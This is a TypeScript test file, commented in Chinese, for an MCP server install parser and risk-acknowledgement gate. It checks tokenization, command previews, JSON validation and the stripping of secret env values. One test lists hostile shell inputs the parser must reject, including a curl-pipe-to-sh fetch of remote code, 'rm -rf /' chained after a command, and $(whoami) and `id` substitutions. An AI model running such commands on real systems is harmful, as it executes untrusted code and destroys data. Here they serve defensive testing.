// MCP 安装输入解析与风险门槛（票 M7-B-T2 / Issue #71）。
//
// 这一层是"安装一个宿主权限进程"的唯一入口，所以测试口径是**每条拒绝路径都要有**：
// 未勾选风险确认、命令含 shell 操作符、JSON 形状不对、参数不是字符串、去重冲突。
import assert from "node:assert/strict";
import { test } from "node:test";
import {
  MCP_RISK_ACK_TEXT,
  MCP_TEMPLATES,
  McpInstallInputError,
  assertRiskAcknowledged,
  formatCommandPreview,
  inferDisplayName,
  parseInstallInput,
  serverIdFor,
  templateToDraft,
  tokenizeCommand,
} from "../src/mcp/install.ts";

// --- 分词 ---------------------------------------------------------------------------

test("tokenizeCommand：普通命令按空白切分", () => {
  assert.deepEqual(tokenizeCommand("npx -y @scope/server /tmp"), ["npx", "-y", "@scope/server", "/tmp"]);
});

test("tokenizeCommand：单双引号内的空白不切分", () => {
  assert.deepEqual(tokenizeCommand(`python3 "/path with space/server.py" --flag`), [
    "python3",
    "/path with space/server.py",
    "--flag",
  ]);
  assert.deepEqual(tokenizeCommand("server 'a b' c"), ["server", "a b", "c"]);
});

test("tokenizeCommand：空引号产生空参数（不是丢弃）", () => {
  assert.deepEqual(tokenizeCommand('cmd "" x'), ["cmd", "", "x"]);
});

test("tokenizeCommand：反斜杠转义空格", () => {
  assert.deepEqual(tokenizeCommand("cmd a\\ b"), ["cmd", "a b"]);
});

test("tokenizeCommand：未闭合引号报错（宁可装不上，也不猜）", () => {
  assert.throws(() => tokenizeCommand('cmd "unterminated'), /unterminated double quote/);
  assert.throws(() => tokenizeCommand("cmd 'unterminated"), /unterminated single quote/);
});

// --- 命令展示不带引号歧义 -----------------------------------------------------------

test("formatCommandPreview：简单参数不加引号", () => {
  assert.equal(formatCommandPreview("npx", ["-y", "@scope/pkg", "/tmp"]), "npx -y @scope/pkg /tmp");
});

test("formatCommandPreview：含空白的参数加单引号（可原样复制到终端核对）", () => {
  assert.equal(formatCommandPreview("node", ["/path with space/x.js"]), "node '/path with space/x.js'");
});

test("formatCommandPreview：含单引号的参数正确转义", () => {
  const preview = formatCommandPreview("node", ["a'b"]);
  assert.equal(preview, `node 'a'\\''b'`);
});

test("formatCommandPreview：完整命令不截断（超长参数原样保留）", () => {
  const longArg = "x".repeat(5000);
  const preview = formatCommandPreview("cmd", [longArg]);
  assert.equal(preview.length, 4 + longArg.length, "展示不得截断");
  assert.ok(preview.includes(longArg));
});

// --- 命令形态解析 -------------------------------------------------------------------

test("命令形态：解析出 command 与 args，名字从参数推断", () => {
  const { drafts } = parseInstallInput("npx -y @modelcontextprotocol/server-filesystem /tmp");
  assert.equal(drafts.length, 1);
  assert.equal(drafts[0].command, "npx");
  assert.deepEqual(drafts[0].args, ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]);
  assert.equal(drafts[0].display_name, "server-filesystem");
  assert.equal(drafts[0].source, "manual");
});

test("命令形态：displayName 覆盖推断名", () => {
  const { drafts } = parseInstallInput("npx -y @scope/server", { displayName: "我的文件服务" });
  assert.equal(drafts[0].display_name, "我的文件服务");
});

test("命令形态：显式拒绝 shell 操作符（不做 shell 解释，静默忽略会造成展示≠执行）", () => {
  for (const raw of [
    "curl https://x.sh | sh",
    "npx server && rm -rf /",
    "npx server; ls",
    "npx server > out.log",
    "npx $(whoami)",
    "npx `id`",
  ]) {
    assert.throws(
      () => parseInstallInput(raw),
      (error: unknown) =>
        error instanceof McpInstallInputError && error.code === "unsupported_shape",
      `应拒绝：${raw}`,
    );
  }
});

test("空输入报错", () => {
  assert.throws(() => parseInstallInput("   "), /empty/);
});

// --- JSON 形态解析 ------------------------------------------------------------------

test("JSON：标准 mcpServers 形状（多台）", () => {
  const raw = JSON.stringify({
    mcpServers: {
      fs: { command: "npx", args: ["-y", "@mcp/fs", "/tmp"] },
      git: { command: "npx", args: ["-y", "@mcp/git"] },
    },
  });
  const { drafts } = parseInstallInput(raw);
  assert.equal(drafts.length, 2);
  assert.deepEqual(drafts.map((draft) => draft.display_name).sort(), ["fs", "git"]);
  assert.equal(drafts[0].command, "npx");
});

test("JSON：servers 别名也接受；单台形状也接受", () => {
  const viaServers = parseInstallInput(JSON.stringify({ servers: { a: { command: "x" } } }));
  assert.equal(viaServers.drafts.length, 1);
  const single = parseInstallInput(JSON.stringify({ command: "node", args: ["s.js"] }), { displayName: "solo" });
  assert.equal(single.drafts[0].display_name, "solo");
  assert.deepEqual(single.drafts[0].args, ["s.js"]);
});

test("JSON：env 只留键名（值绝不落库），并给出 warning", () => {
  const raw = JSON.stringify({
    mcpServers: { s: { command: "node", env: { API_KEY: "sk-secret-value", DEBUG: "1" } } },
  });
  const { drafts, warnings } = parseInstallInput(raw);
  assert.deepEqual(drafts[0].env_keys.sort(), ["API_KEY", "DEBUG"]);
  assert.equal(JSON.stringify(drafts).includes("sk-secret-value"), false, "env 值不得出现在解析结果里");
  assert.equal(warnings.length, 1);
  assert.match(warnings[0], /env values were discarded/);
});

test("JSON：cwd 可选透传", () => {
  const raw = JSON.stringify({ mcpServers: { s: { command: "node", cwd: "/work" } } });
  assert.equal(parseInstallInput(raw).drafts[0].cwd, "/work");
});

test("JSON：各种坏形状都被拒（逐字段校验，不静默默认）", () => {
  const bad = [
    JSON.stringify({ mcpServers: {} }), // 空容器
    JSON.stringify({ mcpServers: { s: {} } }), // 缺 command
    JSON.stringify({ mcpServers: { s: { command: "" } } }), // 空 command
    JSON.stringify({ mcpServers: { s: { command: "x", args: "not-array" } } }),
    JSON.stringify({ mcpServers: { s: { command: "x", args: [1] } } }), // 参数非字符串
    JSON.stringify({ mcpServers: { s: { command: "x", env: [] } } }),
    JSON.stringify({ mcpServers: { s: { command: "x", cwd: 1 } } }),
    JSON.stringify({ something: "else" }), // 无 command 也无容器
    JSON.stringify({ mcpServers: { s: "not-an-object" } }),
    "[]",
    "null",
  ];
  for (const raw of bad) {
    assert.throws(() => parseInstallInput(raw), McpInstallInputError, `应拒绝：${raw}`);
  }
});

test("JSON 语法错误报可读错误", () => {
  assert.throws(() => parseInstallInput("{not json"), /JSON parse failed/);
});

// --- 风险门槛 -----------------------------------------------------------------------

test("未勾选风险确认 → 拒绝（这是硬门槛，不是 UI 提示）", () => {
  for (const value of [undefined, false, "true", 1, null, {}]) {
    assert.throws(
      () => assertRiskAcknowledged(value),
      (error: unknown) =>
        error instanceof McpInstallInputError && error.code === "risk_not_acknowledged",
      `应拒绝：${String(value)}`,
    );
  }
  assert.doesNotThrow(() => assertRiskAcknowledged(true));
});

test("风险文案写明「宿主权限、不是沙箱」——不得让 Owner 误以为有隔离", () => {
  assert.match(MCP_RISK_ACK_TEXT, /宿主/);
  assert.match(MCP_RISK_ACK_TEXT, /同等/);
  assert.match(MCP_RISK_ACK_TEXT, /可以出网|出网/);
  assert.match(MCP_RISK_ACK_TEXT, /可以执行命令/);
  assert.match(MCP_RISK_ACK_TEXT, /不是沙箱/);
  assert.equal(/完全隔离|沙箱隔离/.test(MCP_RISK_ACK_TEXT), false, "不得宣称已被隔离");
});

// --- server_id 与去重语义 -----------------------------------------------------------

test("serverIdFor：可读 slug；纯中文名退化为哈希后缀", () => {
  assert.equal(serverIdFor("My Files"), "my-files");
  assert.equal(serverIdFor("fs"), "fs");
  const chinese = serverIdFor("文件服务");
  assert.match(chinese, /^server-[0-9a-f]{8}$/);
  // 稳定：同输入同输出
  assert.equal(serverIdFor("文件服务"), chinese);
});

test("inferDisplayName：剥 scope 与扩展名", () => {
  assert.equal(inferDisplayName("npx", ["-y", "@scope/my-server", "/tmp"]), "my-server");
  assert.equal(inferDisplayName("npx", ["-y", "@scope/pkg@1.2.3"]), "pkg@1.2.3");
  assert.equal(inferDisplayName("node", ["server.js"]), "server");
  assert.equal(inferDisplayName("python3", ["-m", "mcp_server"]), "mcp_server");
  assert.equal(inferDisplayName("/usr/local/bin/myserver", []), "myserver");
});

// --- 模板：只预填，不安装不授权 -----------------------------------------------------

test("模板只产预填草稿（source=template），不含任何安装/授权语义", () => {
  assert.ok(MCP_TEMPLATES.length >= 3, "至少 filesystem/git/fetch 三个模板");
  for (const template of MCP_TEMPLATES) {
    const draft = templateToDraft(template);
    assert.equal(draft.source, "template");
    assert.equal(draft.command, template.command);
    assert.deepEqual(draft.args, template.args);
    assert.deepEqual(draft.env_keys, [], "模板不预设任何凭据");
    // 草稿里没有任何 enabled/grants 字段——模板不产生授权
    assert.equal("enabled" in draft, false);
    assert.equal("grants" in draft, false);
  }
});

test("模板参数可编辑（返回副本，改它不影响模板本体）", () => {
  const template = MCP_TEMPLATES[0];
  const draft = templateToDraft(template);
  draft.args.push("/extra");
  assert.equal(template.args.includes("/extra"), false, "模板本体不该被草稿污染");
});

test("模板命令含占位路径（提示 Owner 必须改，不会静默用错误路径）", () => {
  const filesystem = MCP_TEMPLATES.find((template) => template.id === "filesystem");
  assert.ok(filesystem !== undefined);
  assert.ok(filesystem.args.some((arg) => arg.includes("/path/to/")), "占位路径要显眼");
});
